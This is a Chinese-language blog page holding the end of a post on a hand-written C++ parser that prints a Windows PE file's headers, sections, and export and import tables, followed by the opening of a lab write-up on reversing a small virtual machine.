&#123;</span><br><span class="line">            UINT32 ntype = (UINT32) * (UINT32*)name_stru;</span><br><span class="line">            <span class="keyword">if</span> (ntype &amp; <span class="number">0x80000000</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;import by ordinal %40d\n&quot;</span>, ntype &amp; <span class="number">0x7fffffff</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                UINT8* n_stru = <span class="built_in">vtop</span>(ntype, p_section_header, number_of_sections) + fbuffer;</span><br><span class="line">                n_stru += <span class="number">2</span>;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;import by name %40s\n&quot;</span>, n_stru);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            name_stru += <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;--------------------\n&quot;</span>);</span><br><span class="line">        import_table += <span class="number">0x14</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;no import..\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>导入表结构如下：</p>
<p><img src="https://s2.loli.net/2023/07/17/4m7Qy2cEWUjlYnb.png" alt="import"></p>
<p>先根据datadirarray拿到import表，每个导入的文件都会有一个import表，所以import表可能有多个，所以循环遍历；</p>
<p>在import表里有 IAT 和 INT ，这里拿的是 INT ： original_first_thunk，之后获取名称；</p>
<p>STRU在上述代码称为name_stru，是该导入表的所有函数，所以又用一个循环遍历；</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_IMPORT_BY_NAME</span> &#123;</span></span><br><span class="line">     WORD Hint;         <span class="comment">// 该函数的导出序数</span></span><br><span class="line">     BYTE Name[<span class="number">1</span>];      <span class="comment">// 该函数的名字</span></span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>INT里的每一个STRU会指向一个结构体： import by name，里面可能是序数导入的函数，也可能是名称导入的函数，区分就是看最高位是否是1，如果是名字导入，则第二个字节之后就是名称的rva；</p>
<p>在dll链接之后，根据dll自身的导出表中的函数地址，一一对应地修改自身exe文件的导入表中IAT指向，此时IAT便指向了真实的地址；</p>
<h2 id="整体效果"><a href="#整体效果" class="headerlink" title="整体效果"></a>整体效果</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> UINT8;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">short</span> <span class="keyword">int</span> UINT16;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> UINT32;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> UINT64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fapi = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//RVA转FOA</span></span><br><span class="line"><span class="function">UINT32 <span class="title">vtop</span><span class="params">(UINT32 rva, UINT8* p_section_header, UINT16 number_of_sections)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	UINT32 VA;</span><br><span class="line">	UINT32 PA;</span><br><span class="line">	UINT32 true_size;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; number_of_sections; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		VA = (UINT32) * (UINT32*)(p_section_header + <span class="number">12</span>);</span><br><span class="line">		PA = (UINT32) * (UINT32*)(p_section_header + <span class="number">20</span>);</span><br><span class="line">		true_size = (UINT32) * (UINT32*)(p_section_header + <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> ((rva &gt;= VA) &amp;&amp; (rva &lt; VA + true_size))</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (fapi == <span class="number">1</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">return</span> (rva - VA + PA - <span class="number">1</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">return</span> (rva - VA + PA);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		p_section_header += <span class="number">0x28</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;rva error\n\n&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取文件长度</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get_file_size</span><span class="params">(FILE* fp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">fseek</span>(fp, <span class="number">0</span>, SEEK_END);</span><br><span class="line">	<span class="keyword">int</span> size = <span class="built_in">ftell</span>(fp);</span><br><span class="line">	<span class="built_in">fseek</span>(fp, <span class="number">0</span>, SEEK_SET);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> size;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> mode[<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (argc &lt; <span class="number">2</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;\nUsage: %s + ./file_you_want_know\n\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (argc &gt; <span class="number">2</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">sprintf</span>(mode, <span class="string">&quot;%s&quot;</span>, argv[<span class="number">2</span>]);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//读文件</span></span><br><span class="line">	<span class="keyword">char</span>* filename = argv[<span class="number">1</span>];</span><br><span class="line">	FILE* fp;</span><br><span class="line">	<span class="keyword">if</span> ((fp = <span class="built_in">fopen</span>(filename, <span class="string">&quot;r&quot;</span>)) == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;\nfile path maybe wrong?\n\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> fsize = <span class="built_in">get_file_size</span>(fp);</span><br><span class="line"></span><br><span class="line">	UINT8* fbuffer = (UINT8*)<span class="built_in">malloc</span>(fsize);</span><br><span class="line">	<span class="built_in">fread</span>(fbuffer, <span class="number">1</span>, fsize, fp);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fclose</span>(fp);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//获取dos头</span></span><br><span class="line">	UINT8* p_dos_header = fbuffer;</span><br><span class="line"></span><br><span class="line">	UINT16 dos_magic = (UINT16) * ((UINT16*)p_dos_header);</span><br><span class="line">	UINT32 pe_offset;</span><br><span class="line">	<span class="keyword">if</span> (dos_magic != <span class="number">0x5a4d</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;\n%s it&#x27;s not a valid PE file.\n\n&quot;</span>, filename);</span><br><span class="line">		<span class="built_in">free</span>(fbuffer);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		pe_offset = (UINT32) * (UINT32*)(p_dos_header + <span class="number">0x40</span> - <span class="number">4</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//获取pe头</span></span><br><span class="line">	UINT8* p_pe_header = (p_dos_header + pe_offset);</span><br><span class="line"></span><br><span class="line">	UINT32 pe_magic = (UINT32) * ((UINT32*)p_pe_header);</span><br><span class="line">	<span class="keyword">if</span> (pe_magic != <span class="number">0x4550</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> ((UINT32) * (UINT32*)(p_pe_header - <span class="number">1</span>) == <span class="number">0x4550</span>)</span><br><span class="line">			p_pe_header -= <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;\n%s it&#x27;s pe magic number wrong: %x\n&quot;</span>, filename, pe_magic);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//获取file头</span></span><br><span class="line">	UINT8* p_file_header = p_pe_header + <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line">	UINT16 machine_num = (UINT16) * ((UINT16*)p_file_header);</span><br><span class="line">	UINT16 number_of_sections = (UINT16) * (UINT16*)(p_file_header + <span class="number">2</span>);</span><br><span class="line">	UINT16 size_of_optional_header = (UINT16) * (UINT16*)(p_file_header + <span class="number">16</span>);</span><br><span class="line">	UINT16 file_characteristics = (UINT16) * (UINT16*)(p_file_header + <span class="number">18</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\nit&#x27;s machine number is %xh\n&quot;</span>, machine_num);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//获取可选头</span></span><br><span class="line">	UINT8* p_optional_header = p_file_header + <span class="number">20</span>;</span><br><span class="line"></span><br><span class="line">	UINT16 optional_magic = (UINT16) * ((UINT16*)p_optional_header);</span><br><span class="line">	UINT32 oep_offset = (UINT32) * (UINT32*)(p_optional_header + <span class="number">16</span>);</span><br><span class="line">	UINT64 image_base = (UINT64) * (UINT64*)(p_optional_header + <span class="number">24</span>);</span><br><span class="line">	UINT32 section_alignment = (UINT32) * (UINT32*)(p_optional_header + <span class="number">32</span>);</span><br><span class="line">	UINT32 file_alignment = (UINT32) * (UINT32*)(p_optional_header + <span class="number">36</span>);</span><br><span class="line">	UINT32 size_of_image = (UINT32) * (UINT32*)(p_optional_header + <span class="number">56</span>);</span><br><span class="line">	UINT32 size_of_headers = (UINT32) * (UINT32*)(p_optional_header + <span class="number">60</span>);</span><br><span class="line">	UINT16 dll_characteristics = (UINT16) * (UINT16*)(p_optional_header + <span class="number">70</span>);</span><br><span class="line">	<span class="keyword">if</span> (size_of_optional_header == <span class="number">0xe0</span> &amp;&amp; optional_magic == <span class="number">0x10b</span>)</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;standard 32bit mode.\n&quot;</span>);</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (optional_magic == <span class="number">0x10b</span>)</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;32bit mode but size of optional header: %x\n&quot;</span>, size_of_optional_header);</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (size_of_optional_header == <span class="number">0xf0</span> &amp;&amp; optional_magic == <span class="number">0x20b</span>)</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;standard 64bit mode.\n&quot;</span>);</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (optional_magic == <span class="number">0x20b</span>)</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;64bit mode but size of optional header: %x\n&quot;</span>, size_of_optional_header);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;OEP is at 0x%x\n\n&quot;</span>, image_base + oep_offset);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//获取节区头</span></span><br><span class="line">	UINT8* p_section_header = p_optional_header + size_of_optional_header;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (*p_section_header == <span class="number">0</span>)</span><br><span class="line">		p_section_header += <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">char</span> section_name[<span class="number">9</span>];</span><br><span class="line">	UINT32 VA;</span><br><span class="line">	UINT32 PA;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (mode[<span class="number">0</span>] == <span class="number">45</span> &amp;&amp; mode[<span class="number">1</span>] == <span class="number">115</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; number_of_sections; i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">8</span>; j++)</span><br><span class="line">			&#123;</span><br><span class="line">				section_name[j] = p_section_header[j];</span><br><span class="line">			&#125;</span><br><span class="line">			section_name[<span class="number">8</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"></span><br><span class="line">			VA = (UINT32) * (UINT32*)(p_section_header + <span class="number">12</span>);</span><br><span class="line">			PA = (UINT32) * (UINT32*)(p_section_header + <span class="number">20</span>);</span><br><span class="line">			VA += image_base;</span><br><span class="line">			PA += image_base;</span><br><span class="line"></span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%-40s VA 0x%016jx \n                                         PA 0x%016jx \n--------------------\n&quot;</span>, section_name, VA, PA);</span><br><span class="line">			p_section_header += <span class="number">0x28</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		p_section_header = p_optional_header + size_of_optional_header;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//获取datadirarray数组</span></span><br><span class="line">	UINT32 datadirarray_index = (UINT32) * (UINT32*)(p_section_header - <span class="number">0x84</span>);</span><br><span class="line">	UINT8* datadirarray = p_section_header - <span class="number">0x80</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ((mode[<span class="number">0</span>] == <span class="number">45</span> &amp;&amp; mode[<span class="number">1</span>] == <span class="number">116</span>) || (mode[<span class="number">0</span>] == <span class="number">45</span> &amp;&amp; mode[<span class="number">2</span>] == <span class="number">116</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//获取导出表</span></span><br><span class="line">		<span class="keyword">if</span> ((UINT32) * (UINT32*)(datadirarray) != <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">		export_s:</span><br><span class="line">			UINT8* export_table = <span class="built_in">vtop</span>((UINT32) * (UINT32*)(datadirarray), p_section_header, number_of_sections) + fbuffer;</span><br><span class="line">			UINT32 etnamead = (UINT32) * (UINT32*)(export_table + <span class="number">12</span>);</span><br><span class="line">			UINT8* etname = <span class="built_in">vtop</span>(etnamead, p_section_header, number_of_sections) + fbuffer;</span><br><span class="line">			<span class="keyword">if</span> (etname == fbuffer)</span><br><span class="line">			&#123;</span><br><span class="line">				fapi = <span class="number">1</span>;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;correct already..\n\n&quot;</span>);</span><br><span class="line">				<span class="keyword">goto</span> export_s;</span><br><span class="line">			&#125;</span><br><span class="line">			UINT32 number_of_functions = (UINT32) * (UINT32*)(export_table + <span class="number">20</span>);</span><br><span class="line">			UINT32 number_of_names = (UINT32) * (UINT32*)(export_table + <span class="number">24</span>);</span><br><span class="line">			UINT8* ad_of_funcs = <span class="built_in">vtop</span>((UINT32) * (UINT32*)(export_table + <span class="number">28</span>), p_section_header, number_of_sections) + fbuffer;</span><br><span class="line">			UINT8* ad_of_names = <span class="built_in">vtop</span>((UINT32) * (UINT32*)(export_table + <span class="number">32</span>), p_section_header, number_of_sections) + fbuffer;</span><br><span class="line">			UINT8* ad_of_ordis = <span class="built_in">vtop</span>((UINT32) * (UINT32*)(export_table + <span class="number">36</span>), p_section_header, number_of_sections) + fbuffer;</span><br><span class="line"></span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;Export Table:\n&quot;</span>);</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%s\n\n&quot;</span>, etname);</span><br><span class="line">			<span class="keyword">int</span> flag;</span><br><span class="line">			<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; number_of_functions; i++)</span><br><span class="line">			&#123;</span><br><span class="line">				flag = <span class="number">0</span>;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;0x%016jx&quot;</span>, (UINT32) * (UINT32*)(ad_of_funcs + <span class="number">4</span> * i) + image_base);</span><br><span class="line">				<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; number_of_names; j++)</span><br><span class="line">				&#123;</span><br><span class="line">					flag = <span class="number">1</span>;</span><br><span class="line">					<span class="keyword">if</span> (i == (UINT16) * (UINT16*)(ad_of_ordis + <span class="number">2</span> * j))</span><br><span class="line">					&#123;</span><br><span class="line">						<span class="built_in">printf</span>(<span class="string">&quot;                    %3d     %s\n&quot;</span>, i, <span class="built_in">vtop</span>((UINT32) * (UINT32*)(ad_of_names + <span class="number">4</span> * j), p_section_header, number_of_sections) + fbuffer);</span><br><span class="line">						flag = <span class="number">0</span>;</span><br><span class="line">						<span class="keyword">break</span>;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">if</span> (flag == <span class="number">1</span>)</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="built_in">printf</span>(<span class="string">&quot;                            ---\n&quot;</span>);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;no export..\n&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="comment">//获取导入表</span></span><br><span class="line">		<span class="keyword">if</span> ((UINT32) * (UINT32*)(datadirarray + <span class="number">8</span>) != <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			UINT8* import_table = <span class="built_in">vtop</span>((UINT32) * (UINT32*)(datadirarray + <span class="number">8</span>), p_section_header, number_of_sections) + fbuffer;</span><br><span class="line">			<span class="keyword">while</span> (import_table != <span class="literal">NULL</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				UINT8* original_first_thunk = import_table;</span><br><span class="line">				UINT32 itnamead = (UINT32) * (UINT32*)(import_table + <span class="number">12</span>);</span><br><span class="line">				UINT8* itname = <span class="built_in">vtop</span>(itnamead, p_section_header, number_of_sections) + fbuffer;</span><br><span class="line"></span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;Import Table:\n&quot;</span>);</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;%s\n\n&quot;</span>, itname);</span><br><span class="line"></span><br><span class="line">				UINT8* name_stru = <span class="built_in">vtop</span>((UINT32) * (UINT32*)(original_first_thunk), p_section_header, number_of_sections) + fbuffer;</span><br><span class="line">				<span class="keyword">while</span> (name_stru != <span class="literal">NULL</span>)</span><br><span class="line">				&#123;</span><br><span class="line">					UINT32 ntype = (UINT32) * (UINT32*)name_stru;</span><br><span class="line">					<span class="keyword">if</span> (ntype &amp; <span class="number">0x80000000</span>)</span><br><span class="line">					&#123;</span><br><span class="line">						<span class="built_in">printf</span>(<span class="string">&quot;import by ordinal %40d\n&quot;</span>, ntype &amp; <span class="number">0x7fffffff</span>);</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">else</span></span><br><span class="line">					&#123;</span><br><span class="line">						UINT8* n_stru = <span class="built_in">vtop</span>(ntype, p_section_header, number_of_sections) + fbuffer;</span><br><span class="line">						n_stru += <span class="number">2</span>;</span><br><span class="line">						<span class="built_in">printf</span>(<span class="string">&quot;import by name %40s\n&quot;</span>, n_stru);</span><br><span class="line">					&#125;</span><br><span class="line"></span><br><span class="line">					name_stru += <span class="number">8</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;--------------------\n&quot;</span>);</span><br><span class="line">				import_table += <span class="number">0x14</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;no import..\n&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">free</span>(fbuffer);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>-s -t 模式打印节区和两张表；</p>
<p><img src="https://s2.loli.net/2022/11/12/xzwolNHZFephGKX.png" alt="end?"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>只能说，纯手撸会有些不完善的bug，逻辑上和测试上是没问题的，有些偏移有问题，用微软自带的结构体应该是能解决这个毛病的，而且更好写，想用什么内容直接指就行了；</p>
<p>没有模块化也是bug模糊的问题之一；</p>
<p>写下来对PE有更深刻的理解；</p>
<p><img src="https://s2.loli.net/2022/11/12/tsp7CmQUhZd6nRI.png" alt="genshin"></p>
</div></div><a class="button-hover more" href="/SecondBC/2022/11/12/PE%E7%AE%80%E5%8D%95%E8%A7%A3%E6%9E%90%E5%99%A8/#more">阅读全文</a></div><div class="recent-post-item"><a class="post-title" href="/SecondBC/2022/11/06/2022-syc-bin%E4%BA%8C%E9%9D%A2/">2022-syc-bin二面</a><div class="container"><time class="button-hover post-date"><i class="fas fa-calendar-alt article-icon" aria-hidden="true"></i> 更新于 2022-11-06</time><div class="button-hover categories"><i class="fa fa-inbox article-icon" aria-hidden="true"></i><a class="link-a" href="/SecondBC/categories/Lab/">Lab</a></div><div class="button-hover tags"><i class="fa fa-tag article-icon" aria-hidden="true"></i><a class="link-a" href="/SecondBC/tags/Syc/">Syc</a></div></div><div class="post-content"><div class="main-content content"><h2 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h2><blockquote>
<p>逆向一个虚拟机，编写适应于其的二进制文件，实现tea算法；</p>
</blockquote>
<p><img src="https://s2.loli.net/2022/10/31/XlNWK2jqOH4iMDv.png" alt="main"></p>
<p>上图左侧为main函数，逻辑就是读取名称 “binary” 的内容，然后将其赋给code，之后将code扔进vm函数充当指令集；</p>
<p>每条指令分三个数值，一个指令数，两个操作数，分别给了instru和One，Two变量；</p>
<p>根据输入不同的instru变量来调用不同的函数，这些函数就是指令执行的操作了，翻译如下：</p>
